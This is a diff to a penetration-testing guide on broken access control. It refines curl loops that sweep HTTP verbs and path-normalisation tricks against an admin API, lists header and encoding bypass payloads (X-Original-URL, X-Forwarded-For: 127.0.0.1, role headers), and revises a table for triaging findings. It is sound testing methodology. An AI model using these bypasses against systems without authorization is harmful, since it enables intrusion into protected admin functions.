@@ -58,10 +58,20 @@ awk '$3=="anon=200"' authz-matrix.txt    # no authentication at all
 **4. Sweep the verbs.** Middleware is frequently attached to `GET` and forgotten on the rest.
 
 ```bash
+U="https://$H/api/admin/users"; AUTH=(-H "Authorization: Bearer $TOK_A")
 for M in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
   printf '%-8s ' "$M"
-  curl -sk -X "$M" "https://$H/api/admin/users" -H "Authorization: Bearer $TOK_A" \
-    -H 'Content-Type: application/json' -d '{}' -o /dev/null -w '%{http_code}\n'
+  case "$M" in
+    # -X HEAD hangs: curl waits for a body the reply never sends. Measured on curl 8.5.0 against
+    # an HTTP/1.1 keep-alive handler - no status, killed at 8s (exit 124), while -I answered 200.
+    HEAD) curl -sk --max-time 15 -I "$U" "${AUTH[@]}" -o /dev/null -w '%{http_code}\n' ;;
+    # no body on the safe verbs - a body on GET is dropped or rejected by some proxies, which
+    # changes what you are measuring
+    GET|OPTIONS|TRACE) curl -sk --max-time 15 -X "$M" "$U" "${AUTH[@]}" \
+            -o /dev/null -w '%{http_code}\n' ;;
+    *) curl -sk --max-time 15 -X "$M" "$U" "${AUTH[@]}" \
+            -H 'Content-Type: application/json' -d '{}' -o /dev/null -w '%{http_code}\n' ;;
+  esac
 done
 ```
 
@@ -70,19 +80,39 @@ done
 ```
 path case          /Admin/  /ADMIN/               framework route matching vs proxy ACL
 path tricks        /admin/. /admin//  /./admin/  /admin%2f  /admin/..;/  /admin..;/
-                   /admin;/  /admin/~  /admin#  /admin?  /%2e/admin
+                   /admin;/  /admin/~  /admin%23  /admin?  /%2e/admin
 extension          /admin.json  /admin.css  /admin/  (trailing slash)
 encoding           /%61dmin  /%2561dmin (double)  unicode dotless forms
 method override    X-HTTP-Method-Override: GET   _method=GET   X-Method-Override
-URL override       X-Original-URL: /admin   X-Rewrite-URL: /admin   (nginx/IIS front ends)
+URL override       X-Original-URL: /admin   X-Rewrite-URL: /admin   (read by the app - see below)
 source spoof       X-Forwarded-For: 127.0.0.1   X-Real-IP: 127.0.0.1   X-Client-IP
                    X-Forwarded-Host: localhost   X-Originating-IP   Via
 protocol           HTTP/1.0 vs HTTP/2, absolute-URI request line
 role headers       X-User-Role: admin   X-Is-Admin: true   X-Tenant-Id: <other>
 ```
 
+**Send every literal-path rung with `curl --path-as-is`.** Without it curl collapses dot-segments
+before it writes the request line - measured on curl 8.5.0, `/admin/.` and `/./admin/` both leave as
+`/admin/` and `/admin/..` as `/` - so you get the baseline 403 back and kill a path-normalisation
+differential on a target that was vulnerable. `%2f`, `%2e`, `%2561`, `..;/` and `;/` forms are passed
+through untouched either way. A fragment never leaves the client: `/admin#` is sent as plain
+`/admin`, byte-identical to the baseline, so use `/admin%23` (also `/admin%3f`, `/admin%20`) when you
+want those bytes on the wire. A raw request through `zp-proxy` sidesteps the whole question.
+
+```bash
+for P in '/admin/.' '/./admin/' '/admin%2f' '/admin/..;/' '/admin%23' '/%2e/admin'; do
+  printf '%-16s ' "$P"
+  curl -sk --path-as-is --max-time 15 "https://$H$P" "${AUTH[@]}" -o /dev/null -w '%{http_code}\n'
+done
+```
+
 `X-Original-URL` and `X-Rewrite-URL` deserve their own mention: when a reverse proxy enforces
 the ACL on the front-end path while the app routes on the header, you walk straight past it.
+The header is honoured **by the application, not by the front end** - IIS with URL Rewrite or
+ISAPI_Rewrite, and Symfony (so Laravel) through `Request::prepareRequestUri()`, which reads
+`X-Original-URL` then `X-Rewrite-URL` for IIS compatibility. nginx reads neither. Fingerprint the
+*backend* framework before calling this rung closed: any front end - nginx, Apache, ALB, Cloudflare -
+can be the ACL you walk past, and the header is read behind it.
 
 ```bash
 curl -sk "https://$H/" -H "X-Original-URL: /admin/users" -H "Authorization: Bearer $TOK_A" -o /dev/null -w '%{http_code}\n'
@@ -132,7 +162,8 @@ order.
 | role change accepted (200) but not persisted | not a finding. Always read the object back |
 | you escalated using an admin credential you found | that is not escalation, that is using a leaked credential. Report the leak |
 | the "admin" panel is documented as customer-accessible | killed. Read the docs |
-| OPTIONS/HEAD returns 200 on an admin route | informational only - existence disclosure |
+| OPTIONS returns 200 on an admin route | normally the CORS or server layer answering uniformly. Not a finding on its own, and often not even existence disclosure |
+| HEAD returns 200 where GET is 403 | **verb-scoped authorization** - middleware bound to specific methods, and usually the same gap on POST/PUT/PATCH/DELETE. Go back to step 4, show the least destructive state-changing verb reaching the handler, and report that with the HEAD/GET pair as the evidence |
 | privileged data present in a user-facing response | **confirmed leak** even if the UI hides it |
 
 **The distinction that changes the report:** no session required -> missing authentication;
